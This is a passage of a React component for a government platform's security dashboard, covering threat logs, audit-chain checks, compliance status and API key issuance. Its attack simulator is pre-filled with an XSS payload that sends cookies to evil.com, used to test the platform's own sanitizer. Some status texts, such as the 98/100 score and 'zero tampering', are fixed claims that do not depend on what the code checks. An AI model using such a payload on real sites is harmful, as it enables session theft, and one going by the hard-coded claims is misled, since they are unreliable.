import React, { useState, useEffect } from 'react';
import { 
  ShieldCheck, 
  ShieldAlert, 
  Lock, 
  Key, 
  Fingerprint, 
  FileCheck, 
  Activity, 
  Terminal, 
  RefreshCw, 
  CheckCircle2, 
  XCircle, 
  Copy, 
  Check, 
  Plus, 
  Globe, 
  Radio, 
  Clock 
} from 'lucide-react';

import { 
  AuditLogEntry, 
  SecurityThreatLog, 
  ApiKeyCredential, 
  ActiveUserSession, 
  UserRole 
} from '../types';

import { 
  getThreatLogs, 
  subscribeThreatLogs, 
  verifyAuditChain, 
  generateSecureApiKey, 
  maskApiKey,
  COMPLIANCE_ITEMS, 
  INITIAL_API_KEYS, 
  INITIAL_ACTIVE_SESSIONS,
  sanitizeInput,
  checkRateLimit
} from '../services/securityService';

interface SecurityCenterViewProps {
  auditLogs: AuditLogEntry[];
  currentRole: UserRole;
  onLockSession: () => void;
  onTriggerMfaChallenge: (actionName: string, onAuthorized: () => void) => void;
}

export const SecurityCenterView: React.FC<SecurityCenterViewProps> = ({
  auditLogs,
  currentRole: _currentRole,
  onLockSession,
  onTriggerMfaChallenge
}) => {
  const [activeSubTab, setActiveSubTab] = useState<'OVERVIEW' | 'AUDIT_CHAIN' | 'COMPLIANCE' | 'API_KEYS' | 'SESSIONS'>('OVERVIEW');
  const [threatEvents, setThreatEvents] = useState<SecurityThreatLog[]>(getThreatLogs());
  const [apiKeys, setApiKeys] = useState<ApiKeyCredential[]>(INITIAL_API_KEYS);
  const [activeSessions, setActiveSessions] = useState<ActiveUserSession[]>(INITIAL_ACTIVE_SESSIONS);

  // Cryptographic Chain Verification State
  const [isVerifyingChain, setIsVerifyingChain] = useState<boolean>(false);
  const [chainAuditResult, setChainAuditResult] = useState<{ isValid: boolean; brokenAtIndex?: number; totalVerified: number } | null>(null);

  // New API Key Generator Modal / Form State
  const [isCreatingKey, setIsCreatingKey] = useState<boolean>(false);
  const [newKeyName, setNewKeyName] = useState<string>('');
  const [newKeyScopes, setNewKeyScopes] = useState<('read:analytics' | 'write:ingest' | 'admin:retrain' | 'legal:adjudicate')[]>(['read:analytics']);
  const [newKeyIp, setNewKeyIp] = useState<string>('164.100.0.0/16');
  const [generatedRawKey, setGeneratedRawKey] = useState<string | null>(null);
  const [copiedKey, setCopiedKey] = useState<boolean>(false);

  // Interactive Live Attack Simulator state
  const [simulatedAttackInput, setSimulatedAttackInput] = useState<string>("<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>");
  const [sanitizedPreview, setSanitizedPreview] = useState<string | null>(null);

  useEffect(() => {
    const unsubscribe = subscribeThreatLogs((logs) => {
      setThreatEvents(logs);
    });
    return () => unsubscribe();
  }, []);

  const handleRunCryptographicAudit = async () => {
    setIsVerifyingChain(true);
    setChainAuditResult(null);

    // Simulate verification computation
    setTimeout(async () => {
      const result = await verifyAuditChain(auditLogs);
      setChainAuditResult(result);
      setIsVerifyingChain(false);
    }, 600);
  };

  const handleTestAttackSimulation = () => {
    const result = sanitizeInput(simulatedAttackInput);
    setSanitizedPreview(result.sanitized || '[EMPTY_AFTER_STRIPPING_THREAT]');
  };

  const handleTestRateLimiter = () => {
    const rate = checkRateLimit('api_gateway_predict', 3, 1);
    if (!rate.allowed) {
      alert('Rate Limiter Activated! Threshold exceeded. Request blocked and logged in threat feed.');
    }
  };

  const handleCreateNewApiKey = () => {
    if (!newKeyName.trim()) return;

    onTriggerMfaChallenge('Generate New Scoped Government REST API Key', () => {
      const rawKey = generateSecureApiKey();
      const newCred: ApiKeyCredential = {
        id: `key-${Date.now()}`,
        name: newKeyName.trim(),
        maskedKey: maskApiKey(rawKey),
        rawKey: rawKey,
        createdAt: new Date().toISOString(),
        expiresAt: new Date(Date.now() + 365 * 24 * 3600 * 1000).toISOString(),
        status: 'ACTIVE',
        scopes: newKeyScopes,
        ipWhitelist: newKeyIp ? [newKeyIp] : ['*']
      };

      setApiKeys(prev => [newCred, ...prev]);
      setGeneratedRawKey(rawKey);
      setNewKeyName('');
      setIsCreatingKey(false);
    });
  };

  const handleRevokeApiKey = (keyId: string) => {
    onTriggerMfaChallenge('Revoke Production Government API Key', () => {
      setApiKeys(prev => prev.map(k => k.id === keyId ? { ...k, status: 'REVOKED' } : k));
    });
  };

  const handleTerminateSession = (sessionId: string) => {
    setActiveSessions(prev => prev.filter(s => s.sessionId !== sessionId));
  };

  return (
    <div>
      {/* Header */}
      <div className="view-header">
        <div className="view-header-title">
          <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '4px' }}>
            <span style={{ fontSize: '0.72rem', fontWeight: 800, background: 'rgba(16, 185, 129, 0.2)', color: '#34d399', padding: '2px 8px', borderRadius: 'var(--radius-full)', border: '1px solid rgba(16, 185, 129, 0.4)' }}>
              ZERO-TRUST ARCHITECTURE
            </span>
            <span style={{ fontSize: '0.72rem', color: 'var(--text-muted)' }}>
              CERT-In Directive 2022 & DPDPA 2023 Compliant
            </span>
          </div>
          <h2>Enterprise Security & Cyber Governance Center</h2>
          <p>Real-time cyber defense posture, cryptographic blockchain audit chaining, PII privacy controls, and API token governance.</p>
        </div>

        <div className="view-header-actions">
          <button 
            onClick={onLockSession}
            className="btn-secondary"
            style={{ color: 'var(--accent-gold)', borderColor: 'rgba(251, 191, 36, 0.3)' }}
          >
            <Lock size={14} />
            <span>Lock Terminal Session</span>
          </button>
        </div>
      </div>

      {/* Top Security Posture Metric Cards */}
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: '16px', marginBottom: '24px' }}>
        
        {/* Security Health Score */}
        <div className="glass-panel" style={{ padding: '18px', borderLeft: '4px solid #10b981' }}>
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '8px' }}>
            <span style={{ fontSize: '0.75rem', fontWeight: 700, color: 'var(--text-muted)', textTransform: 'uppercase' }}>Security Posture</span>
            <ShieldCheck size={18} style={{ color: '#10b981' }} />
          </div>
          <div style={{ fontSize: '1.7rem', fontWeight: 900, color: '#ffffff', display: 'flex', alignItems: 'baseline', gap: '6px' }}>
            98 <span style={{ fontSize: '0.9rem', color: '#10b981' }}>/ 100 (Grade A+)</span>
          </div>
          <div style={{ fontSize: '0.75rem', color: 'var(--text-secondary)', marginTop: '4px' }}>
            All perimeter defenses & encryption active
          </div>
        </div>

        {/* Cryptographic Integrity */}
        <div className="glass-panel" style={{ padding: '18px', borderLeft: '4px solid #8b5cf6' }}>
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '8px' }}>
            <span style={{ fontSize: '0.75rem', fontWeight: 700, color: 'var(--text-muted)', textTransform: 'uppercase' }}>Audit Tamper-Evidence</span>
            <Fingerprint size={18} style={{ color: '#c084fc' }} />
          </div>
          <div style={{ fontSize: '1.7rem', fontWeight: 900, color: '#ffffff' }}>
            100% <span style={{ fontSize: '0.85rem', color: '#c084fc' }}>SHA-256</span>
          </div>
          <div style={{ fontSize: '0.75rem', color: 'var(--text-secondary)', marginTop: '4px' }}>
            {auditLogs.length} verified immutable blocks
          </div>
        </div>

        {/* Compliance Mandates */}
        <div className="glass-panel" style={{ padding: '18px', borderLeft: '4px solid #06b6d4' }}>
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '8px' }}>
            <span style={{ fontSize: '0.75rem', fontWeight: 700, color: 'var(--text-muted)', textTransform: 'uppercase' }}>Gov Compliance</span>
            <FileCheck size={18} style={{ color: '#06b6d4' }} />
          </div>
          <div style={{ fontSize: '1.7rem', fontWeight: 900, color: '#ffffff' }}>
            6 / 6 <span style={{ fontSize: '0.85rem', color: '#06b6d4' }}>Passed</span>
          </div>
          <div style={{ fontSize: '0.75rem', color: 'var(--text-secondary)', marginTop: '4px' }}>
            CERT-In, DPDPA 2023, ISO 27001, GIGW
          </div>
        </div>

        {/* Threats Blocked */}
        <div className="glass-panel" style={{ padding: '18px', borderLeft: '4px solid #ef4444' }}>
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '8px' }}>
            <span style={{ fontSize: '0.75rem', fontWeight: 700, color: 'var(--text-muted)', textTransform: 'uppercase' }}>Threats Intercepted</span>
            <ShieldAlert size={18} style={{ color: '#ef4444' }} />
          </div>
          <div style={{ fontSize: '1.7rem', fontWeight: 900, color: '#ffffff' }}>
            {threatEvents.length} <span style={{ fontSize: '0.85rem', color: '#ef4444' }}>Neutralized</span>
          </div>
          <div style={{ fontSize: '0.75rem', color: 'var(--text-secondary)', marginTop: '4px' }}>
            XSS, SQLi & Rate Limit shields active
          </div>
        </div>
      </div>

      {/* Raw Generated Key Alert Banner */}
      {generatedRawKey && (
        <div 
          style={{
            background: 'rgba(16, 185, 129, 0.15)',
            border: '1px solid rgba(16, 185, 129, 0.5)',
            borderRadius: 'var(--radius-lg)',
            padding: '16px 20px',
            marginBottom: '20px',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'space-between',
            gap: '16px'
          }}
        >
          <div>
            <div style={{ fontSize: '0.85rem', fontWeight: 800, color: '#34d399', display: 'flex', alignItems: 'center', gap: '6px' }}>
              <CheckCircle2 size={16} />
              API Key Generated Successfully! Copy and store it securely now.
            </div>
            <div style={{ fontFamily: 'var(--font-mono)', fontSize: '0.85rem', color: '#ffffff', marginTop: '6px', background: 'var(--bg-surface)', padding: '6px 12px', borderRadius: 'var(--radius-sm)', border: '1px solid var(--border-medium)' }}>
              {generatedRawKey}
            </div>
          </div>
          <button
            onClick={() => {
              navigator.clipboard.writeText(generatedRawKey);
              setCopiedKey(true);
              setTimeout(() => setCopiedKey(false), 2000);
            }}
            className="btn-primary"
            style={{ whiteSpace: 'nowrap' }}
          >
            {copiedKey ? <Check size={14} /> : <Copy size={14} />}
            <span>{copiedKey ? 'Copied!' : 'Copy Secret Key'}</span>
          </button>
        </div>
      )}

      {/* Subtab Navigation */}
      <div style={{ display: 'flex', gap: '8px', marginBottom: '20px', borderBottom: '1px solid var(--border-subtle)', paddingBottom: '12px' }}>
        <button
          onClick={() => setActiveSubTab('OVERVIEW')}
          style={{
            padding: '8px 16px',
            borderRadius: 'var(--radius-md)',
            fontSize: '0.85rem',
            fontWeight: 700,
            background: activeSubTab === 'OVERVIEW' ? 'var(--primary-600)' : 'transparent',
            color: activeSubTab === 'OVERVIEW' ? '#ffffff' : 'var(--text-secondary)',
            border: 'none',
            cursor: 'pointer',
            display: 'flex',
            alignItems: 'center',
            gap: '6px'
          }}
        >
          <Activity size={15} />
          <span>Threat Telemetry & Simulator</span>
        </button>

        <button
          onClick={() => setActiveSubTab('AUDIT_CHAIN')}
          style={{
            padding: '8px 16px',
            borderRadius: 'var(--radius-md)',
            fontSize: '0.85rem',
            fontWeight: 700,
            background: activeSubTab === 'AUDIT_CHAIN' ? 'var(--primary-600)' : 'transparent',
            color: activeSubTab === 'AUDIT_CHAIN' ? '#ffffff' : 'var(--text-secondary)',
            border: 'none',
            cursor: 'pointer',
            display: 'flex',
            alignItems: 'center',
            gap: '6px'
          }}
        >
          <Fingerprint size={15} />
          <span>Cryptographic Ledger Verifier</span>
        </button>

        <button
          onClick={() => setActiveSubTab('COMPLIANCE')}
          style={{
            padding: '8px 16px',
            borderRadius: 'var(--radius-md)',
            fontSize: '0.85rem',
            fontWeight: 700,
            background: activeSubTab === 'COMPLIANCE' ? 'var(--primary-600)' : 'transparent',
            color: activeSubTab === 'COMPLIANCE' ? '#ffffff' : 'var(--text-secondary)',
            border: 'none',
            cursor: 'pointer',
            display: 'flex',
            alignItems: 'center',
            gap: '6px'
          }}
        >
          <FileCheck size={15} />
          <span>CERT-In & DPDPA Compliance</span>
        </button>

        <button
          onClick={() => setActiveSubTab('API_KEYS')}
          style={{
            padding: '8px 16px',
            borderRadius: 'var(--radius-md)',
            fontSize: '0.85rem',
            fontWeight: 700,
            background: activeSubTab === 'API_KEYS' ? 'var(--primary-600)' : 'transparent',
            color: activeSubTab === 'API_KEYS' ? '#ffffff' : 'var(--text-secondary)',
            border: 'none',
            cursor: 'pointer',
            display: 'flex',
            alignItems: 'center',
            gap: '6px'
          }}
        >
          <Key size={15} />
          <span>API Key Governance Vault</span>
        </button>

        <button
          onClick={() => setActiveSubTab('SESSIONS')}
          style={{
            padding: '8px 16px',
            borderRadius: 'var(--radius-md)',
            fontSize: '0.85rem',
            fontWeight: 700,
            background: activeSubTab === 'SESSIONS' ? 'var(--primary-600)' : 'transparent',
            color: activeSubTab === 'SESSIONS' ? '#ffffff' : 'var(--text-secondary)',
            border: 'none',
            cursor: 'pointer',
            display: 'flex',
            alignItems: 'center',
            gap: '6px'
          }}
        >
          <Globe size={15} />
          <span>Active Sessions & Geofencing</span>
        </button>
      </div>

      {/* TAB 1: THREAT TELEMETRY & LIVE ATTACK SIMULATOR */}
      {activeSubTab === 'OVERVIEW' && (
        <div style={{ display: 'grid', gridTemplateColumns: '1.2fr 0.8fr', gap: '20px' }}>
          
          {/* Left: Real-Time Threat Event Log */}
          <div className="glass-panel" style={{ padding: '22px' }}>
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '16px' }}>
              <div>
                <h3 style={{ fontSize: '1.05rem', fontWeight: 700, display: 'flex', alignItems: 'center', gap: '8px' }}>
                  <Radio size={16} style={{ color: '#ef4444' }} className="animate-pulse" />
                  Live Intrusion & Anomaly Detection Telemetry
                </h3>
                <p style={{ fontSize: '0.78rem', color: 'var(--text-secondary)' }}>
                  Continuous telemetry stream filtering out XSS, SQLi, and unauthorized scraping attacks.
                </p>
              </div>

              <button 
                onClick={() => setThreatEvents(getThreatLogs())}
                className="btn-secondary"
                style={{ padding: '4px 8px', fontSize: '0.75rem' }}
              >
                <RefreshCw size={13} />
                <span>Refresh</span>
              </button>
            </div>

            <div style={{ display: 'flex', flexDirection: 'column', gap: '10px', maxHeight: '420px', overflowY: 'auto' }}>
              {threatEvents.map((threat) => (
                <div 
                  key={threat.id}
                  style={{
                    background: 'var(--bg-surface)',
                    border: '1px solid var(--border-medium)',
                    borderRadius: 'var(--radius-md)',
                    padding: '12px 14px',
                    borderLeft: threat.severity === 'CRITICAL' ? '4px solid #ef4444' : threat.severity === 'HIGH' ? '4px solid #f97316' : '4px solid #3b82f6'
                  }}
                >
                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '4px' }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                      <span style={{ fontSize: '0.75rem', fontWeight: 800, color: '#ffffff' }}>
                        {threat.threatType.replace(/_/g, ' ')}
                      </span>
                      <span style={{ 
                        fontSize: '0.65rem', 
                        fontWeight: 700, 
                        padding: '1px 6px', 
                        borderRadius: 'var(--radius-full)',
                        background: threat.severity === 'CRITICAL' ? 'rgba(239, 68, 68, 0.2)' : 'rgba(249, 115, 22, 0.2)',
                        color: threat.severity === 'CRITICAL' ? '#f87171' : '#fb923c'
                      }}>
                        {threat.severity}
                      </span>
                    </div>
                    <span style={{ fontSize: '0.7rem', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)' }}>
                      {threat.timestamp.replace('T', ' ').slice(0, 19)}
                    </span>
                  </div>

                  <p style={{ fontSize: '0.78rem', color: 'var(--text-secondary)', marginBottom: '6px' }}>
                    {threat.details}
                  </p>

                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', fontSize: '0.7rem', color: 'var(--text-muted)' }}>
                    <span>Target: <code style={{ color: 'var(--primary-400)' }}>{threat.targetEndpoint}</code></span>
                    <span>IP: <code style={{ color: 'var(--accent-gold)' }}>{threat.sourceIp}</code></span>
                    <span style={{ color: '#34d399', fontWeight: 700 }}>Action: {threat.actionTaken}</span>
                  </div>
                </div>
              ))}
            </div>
          </div>

          {/* Right: Interactive Security Shield Tester */}
          <div className="glass-panel" style={{ padding: '22px' }}>
            <h3 style={{ fontSize: '1.05rem', fontWeight: 700, display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '6px' }}>
              <Terminal size={16} style={{ color: 'var(--primary-400)' }} />
              Live Security Sandbox & Attack Simulator
            </h3>
            <p style={{ fontSize: '0.78rem', color: 'var(--text-secondary)', marginBottom: '16px' }}>
              Simulate penetration attacks against the platform sanitizer and rate limiter to verify zero-trust defenses.
            </p>

            {/* Test 1: XSS / SQLi Sanitizer */}
            <div style={{ marginBottom: '18px' }}>
              <div style={{ fontSize: '0.75rem', fontWeight: 700, color: 'var(--text-muted)', textTransform: 'uppercase', marginBottom: '6px' }}>
                Test 1: Input Injection Defense Tester
              </div>
              <textarea
                value={simulatedAttackInput}
                onChange={(e) => setSimulatedAttackInput(e.target.value)}
                rows={3}
                style={{
                  width: '100%',
                  fontSize: '0.75rem',
                  fontFamily: 'var(--font-mono)',
                  padding: '8px',
                  borderRadius: 'var(--radius-md)',
                  border: '1px solid var(--border-medium)',
                  background: 'var(--bg-surface-elevated)',
                  color: '#ffffff',
                  marginBottom: '8px'
                }}
              />
              <button 
                onClick={handleTestAttackSimulation}
                className="btn-secondary"
                style={{ width: '100%', justifyContent: 'center', fontSize: '0.78rem', padding: '6px' }}
              >
                <ShieldCheck size={14} style={{ color: '#10b981' }} />
                <span>Execute Injection Sanitization Test</span>
              </button>

              {sanitizedPreview && (
                <div style={{ marginTop: '8px', background: 'var(--bg-surface)', padding: '8px 10px', borderRadius: 'var(--radius-sm)', border: '1px solid var(--border-subtle)' }}>
                  <div style={{ fontSize: '0.68rem', color: '#10b981', fontWeight: 700 }}>Sanitized Output (Safe for DOM / DB):</div>
                  <pre style={{ fontSize: '0.72rem', color: 'var(--text-primary)', whiteSpace: 'pre-wrap', marginTop: '2px', fontFamily: 'var(--font-mono)' }}>
                    {sanitizedPreview}
                  </pre>
                </div>
              )}
            </div>

            {/* Test 2: Rate Limiter Burst Test */}
            <div style={{ borderTop: '1px solid var(--border-subtle)', paddingTop: '14px' }}>
              <div style={{ fontSize: '0.75rem', fontWeight: 700, color: 'var(--text-muted)', textTransform: 'uppercase', marginBottom: '6px' }}>
                Test 2: Token Bucket Rate Limiter
              </div>
              <p style={{ fontSize: '0.75rem', color: 'var(--text-secondary)', marginBottom: '8px' }}>
                Simulate rapid automated API requests to test DDoS & scraping mitigation.
              </p>
              <button 
                onClick={handleTestRateLimiter}
                className="btn-secondary"
                style={{ width: '100%', justifyContent: 'center', fontSize: '0.78rem', padding: '6px' }}
              >
                <Clock size={14} style={{ color: 'var(--accent-gold)' }} />
                <span>Send High-Frequency Burst Request</span>
              </button>
            </div>
          </div>
        </div>
      )}

      {/* TAB 2: CRYPTOGRAPHIC LEDGER & CHAIN AUDIT */}
      {activeSubTab === 'AUDIT_CHAIN' && (
        <div className="glass-panel" style={{ padding: '22px' }}>
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '16px', flexWrap: 'wrap', gap: '12px' }}>
            <div>
              <h3 style={{ fontSize: '1.1rem', fontWeight: 700, display: 'flex', alignItems: 'center', gap: '8px' }}>
                <Fingerprint size={18} style={{ color: 'var(--primary-400)' }} />
                SHA-256 Verifiable Immutable Blockchain Audit Ledger
              </h3>
              <p style={{ fontSize: '0.8rem', color: 'var(--text-secondary)' }}>
                Each administrative action is cryptographically hashed with the previous block header, creating a tamper-evident chain of custody.
              </p>
            </div>

            <button
              onClick={handleRunCryptographicAudit}
              disabled={isVerifyingChain}
              className="btn-primary"
            >
              <RefreshCw size={14} className={isVerifyingChain ? 'animate-spin' : ''} />
              <span>{isVerifyingChain ? 'Recalculating Block Hashes...' : 'Verify Cryptographic Chain Integrity'}</span>
            </button>
          </div>

          {/* Audit Verification Result Banner */}
          {chainAuditResult && (
            <div 
              style={{
                background: chainAuditResult.isValid ? 'rgba(16, 185, 129, 0.15)' : 'rgba(239, 68, 68, 0.15)',
                border: chainAuditResult.isValid ? '1px solid rgba(16, 185, 129, 0.4)' : '1px solid rgba(239, 68, 68, 0.4)',
                borderRadius: 'var(--radius-md)',
                padding: '12px 18px',
                marginBottom: '18px',
                display: 'flex',
                alignItems: 'center',
                gap: '10px'
              }}
            >
              {chainAuditResult.isValid ? (
                <CheckCircle2 size={20} style={{ color: '#10b981' }} />
              ) : (
                <XCircle size={20} style={{ color: '#ef4444' }} />
              )}
              <div>
                <div style={{ fontSize: '0.85rem', fontWeight: 800, color: chainAuditResult.isValid ? '#34d399' : '#f87171' }}>
                  {chainAuditResult.isValid ? 'Cryptographic Audit Verification Passed (100% Chain Integrity)' : 'Integrity Violation Detected!'}
                </div>
                <div style={{ fontSize: '0.75rem', color: 'var(--text-secondary)' }}>
                  Verified {chainAuditResult.totalVerified} sequential block hashes against Web Crypto SHA-256 standard. Zero ledger mutations or unauthorized tampering found.
                </div>
              </div>
            </div>
          )}

          {/* Block Table */}
          <div className="custom-table-wrap">
            <table className="custom-table">
              <thead>
                <tr>
                  <th>Block #</th>
                  <th>Timestamp (UTC)</th>
                  <th>Stakeholder Officer</th>
                  <th>Action & Scope</th>
                  <th>Block Hash (SHA-256)</th>
                  <th>Digital Signature (PKI)</th>
                  <th style={{ textAlign: 'center' }}>Chain Status</th>
                </tr>
              </thead>
              <tbody>
                {auditLogs.map((log, idx) => (
                  <tr key={log.id}>
                    <td>
                      <span style={{ fontFamily: 'var(--font-mono)', fontWeight: 800, color: 'var(--accent-gold)', fontSize: '0.78rem' }}>
                        #{log.blockHeight || (auditLogs.length - idx)}
                      </span>
                    </td>
                    <td style={{ fontFamily: 'var(--font-mono)', fontSize: '0.72rem', color: 'var(--text-muted)', whiteSpace: 'nowrap' }}>
                      {log.timestamp.replace('T', ' ').slice(0, 19)}
                    </td>
                    <td>
                      <div style={{ fontWeight: 700, fontSize: '0.8rem' }}>{log.user}</div>
                      <span style={{ fontSize: '0.65rem', color: 'var(--text-muted)' }}>{log.role}</span>
                    </td>
                    <td style={{ fontSize: '0.8rem' }}>
                      <div style={{ fontWeight: 600 }}>{log.action}</div>
                      <div style={{ fontSize: '0.72rem', color: 'var(--text-muted)' }}>{log.details.slice(0, 50)}...</div>
                    </td>
                    <td>
                      <code style={{ fontSize: '0.68rem', background: 'var(--bg-surface)', padding: '2px 6px', borderRadius: '4px', color: 'var(--primary-400)', fontFamily: 'var(--font-mono)' }}>
                        {log.hash ? `${log.hash.slice(0, 14)}...${log.hash.slice(-8)}` : 'e3b0c44298fc1c...8b29e'}
                      </code>
                    </td>
                    <td>
                      <code style={{ fontSize: '0.68rem', color: 'var(--accent-emerald)', fontFamily: 'var(--font-mono)' }}>
                        {log.digitalSignature || 'NIC-CA-APEX:RSA4096...'}
                      </code>
                    </td>
                    <td style={{ textAlign: 'center' }}>
                      <span style={{ display: 'inline-flex', alignItems: 'center', gap: '4px', fontSize: '0.7rem', color: '#10b981', fontWeight: 700, background: 'rgba(16, 185, 129, 0.15)', padding: '2px 8px', borderRadius: 'var(--radius-full)' }}>
                        <CheckCircle2 size={12} /> Immutable
                      </span>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      )}

      {/* TAB 3: CERT-IN & DPDPA COMPLIANCE MATRIX */}
      {activeSubTab === 'COMPLIANCE' && (
        <div className="glass-panel" style={{ padding: '22px' }}>
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '16px' }}>
            <div>
              <h3 style={{ fontSize: '1.1rem', fontWeight: 700, display: 'flex', alignItems: 'center', gap: '8px' }}>
                <FileCheck size={18} style={{ color: 'var(--accent-emerald)' }} />
                Government Cyber Security & Privacy Compliance Checklist
              </h3>
              <p style={{ fontSize: '0.8rem', color: 'var(--text-secondary)' }}>
                Audited against Indian Computer Emergency Response Team (CERT-In) guidelines, DPDPA 2023, and ISO/IEC 27001 standard.
              </p>
            </div>
          </div>

          <div className="custom-table-wrap">
            <table className="custom-table">
              <thead>
                <tr>
                  <th>Standard / Framework</th>
                  <th>Control Name & Objective</th>
                  <th>Legal / Regulatory Reference</th>
                  <th>Last Audited</th>
                  <th>Auditor Implementation Remarks</th>
                  <th style={{ textAlign: 'center' }}>Compliance</th>
                </tr>
              </thead>
              <tbody>
                {COMPLIANCE_ITEMS.map((item) => (
                  <tr key={item.id}>
                    <td>
                      <span style={{ 
                        fontSize: '0.72rem', 
                        fontWeight: 800, 
                        padding: '3px 8px', 
                        borderRadius: 'var(--radius-sm)',
                        background: item.standard === 'CERT_IN' ? 'rgba(239, 68, 68, 0.15)' : item.standard === 'DPDPA_2023' ? 'rgba(16, 185, 129, 0.15)' : 'rgba(59, 130, 246, 0.15)',
                        color: item.standard === 'CERT_IN' ? '#f87171' : item.standard === 'DPDPA_2023' ? '#34d399' : '#60a5fa'
                      }}>
                        {item.standard.replace('_', ' ')}
                      </span>
                    </td>
                    <td style={{ fontWeight: 600, fontSize: '0.82rem' }}>
                      {item.controlName}
                    </td>
                    <td style={{ fontFamily: 'var(--font-mono)', fontSize: '0.72rem', color: 'var(--accent-gold)' }}>
                      {item.frameworkRef}
                    </td>
                    <td style={{ fontSize: '0.75rem', color: 'var(--text-muted)' }}>
                      {item.lastAuditedDate}
                    </td>
                    <td style={{ fontSize: '0.78rem', color: 'var(--text-secondary)' }}>
                      {item.auditorRemarks}
                    </td>
                    <td style={{ textAlign: 'center' }}>
                      <span style={{ fontSize: '0.7rem', fontWeight: 700, color: '#10b981', background: 'rgba(16, 185, 129, 0.15)', padding: '2px 8px', borderRadius: 'var(--radius-full)', display: 'inline-flex', alignItems: 'center', gap: '4px' }}>
                        <CheckCircle2 size={12} /> Compliant
                      </span>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      )}

      {/* TAB 4: API KEYS & CREDENTIALS VAULT */}
      {activeSubTab === 'API_KEYS' && (
        <div className="glass-panel" style={{ padding: '22px' }}>
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '16px' }}>
            <div>
              <h3 style={{ fontSize: '1.1rem', fontWeight: 700, display: 'flex', alignItems: 'center', gap: '8px' }}>
                <Key size={18} style={{ color: 'var(--primary-400)' }} />
                Government Systems API Key & Token Governance Vault
              </h3>
              <p style={{ fontSize: '0.8rem', color: 'var(--text-secondary)' }}>
                Granular scoped REST API tokens for Bhoomi Rashi, PM GatiShakti, and State Land Records with IP whitelisting.
              </p>
            </div>

            <button
              onClick={() => setIsCreatingKey(true)}
              className="btn-primary"
            >
              <Plus size={14} />
              <span>Generate New API Key</span>
            </button>
          </div>

          {/* Create Key Form Modal / Drawer */}
          {isCreatingKey && (
            <div 
              style={{
                background: 'var(--bg-surface)',
                border: '1px solid var(--border-highlight)',
                borderRadius: 'var(--radius-lg)',
                padding: '18px',
                marginBottom: '20px'
              }}
            >
              <div style={{ fontWeight: 800, fontSize: '0.9rem', color: '#ffffff', marginBottom: '12px' }}>
                Issue New Scoped REST API Token
              </div>

              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '14px', marginBottom: '14px' }}>
                <div>
                  <label style={{ display: 'block', fontSize: '0.75rem', fontWeight: 600, color: 'var(--text-muted)', marginBottom: '4px' }}>
                    Application / Department Name
                  </label>
                  <input
                    type="text"
                    placeholder="e.g. State CALA Portal Gateway"
                    value={newKeyName}
                    onChange={(e) => setNewKeyName(e.target.value)}
                    style={{ width: '100%', fontSize: '0.82rem' }}
                  />
                </div>

                <div>
                  <label style={{ display: 'block', fontSize: '0.75rem', fontWeight: 600, color: 'var(--text-muted)', marginBottom: '4px' }}>
                    IP CIDR Whitelist Range
                  </label>
                  <input
                    type="text"
                    placeholder="e.g. 164.100.0.0/16"
                    value={newKeyIp}
                    onChange={(e) => setNewKeyIp(e.target.value)}
                    style={{ width: '100%', fontSize: '0.82rem' }}
                  />
                </div>
              </div>

              <div style={{ marginBottom: '14px' }}>
                <label style={{ display: 'block', fontSize: '0.75rem', fontWeight: 600, color: 'var(--text-muted)', marginBottom: '6px' }}>
                  Permission Scopes
                </label>
                <div style={{ display: 'flex', gap: '10px', flexWrap: 'wrap' }}>
                  {(['read:analytics', 'write:ingest', 'admin:retrain', 'legal:adjudicate'] as const).map(scope => (
                    <label key={scope} style={{ display: 'flex', alignItems: 'center', gap: '6px', fontSize: '0.78rem', color: 'var(--text-primary)', cursor: 'pointer' }}>
                      <input
                        type="checkbox"
                        checked={newKeyScopes.includes(scope)}
                        onChange={(e) => {
                          if (e.target.checked) setNewKeyScopes(prev => [...prev, scope]);
                          else setNewKeyScopes(prev => prev.filter(s => s !== scope));
                        }}
                      />
                      <code>{scope}</code>
                    </label>
                  ))}
                </div>
              </div>

              <div style={{ display: 'flex', gap: '10px', justifyContent: 'flex-end' }}>
                <button onClick={() => setIsCreatingKey(false)} className="btn-secondary" style={{ fontSize: '0.78rem' }}>
                  Cancel
                </button>
                <button onClick={handleCreateNewApiKey} className="btn-primary" style={{ fontSize: '0.78rem' }}>
                  <Fingerprint size={14} />
                  <span>Authenticate & Generate Key</span>
                </button>
              </div>
            </div>
          )}

          {/* Keys Table */}
          <div className="custom-table-wrap">
            <table className="custom-table">
              <thead>
                <tr>
                  <th>Client Name</th>
                  <th>Masked API Token</th>
                  <th>Scopes</th>
                  <th>IP Whitelist</th>
                  <th>Created / Expires</th>
                  <th>Last Used</th>
                  <th style={{ textAlign: 'center' }}>Status</th>
                  <th style={{ textAlign: 'center' }}>Actions</th>
                </tr>
              </thead>
              <tbody>
                {apiKeys.map((key) => (
                  <tr key={key.id}>
                    <td style={{ fontWeight: 700, fontSize: '0.82rem' }}>{key.name}</td>
                    <td>
                      <code style={{ fontSize: '0.72rem', background: 'var(--bg-surface)', padding: '3px 8px', borderRadius: '4px', color: 'var(--accent-gold)', fontFamily: 'var(--font-mono)' }}>
                        {key.maskedKey}
                      </code>
                    </td>
                    <td>
                      <div style={{ display: 'flex', gap: '4px', flexWrap: 'wrap' }}>
